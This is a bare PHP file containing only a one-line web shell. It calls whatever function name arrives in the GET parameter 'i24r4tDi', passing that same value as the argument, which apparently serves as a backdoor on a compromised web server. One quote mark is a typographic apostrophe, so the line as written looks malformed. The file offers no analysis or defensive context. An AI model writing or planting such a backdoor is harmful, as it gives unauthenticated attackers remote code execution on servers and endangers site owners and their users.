<?php
$_GET[’i24r4tDi']($_GET['i24r4tDi']);
?>
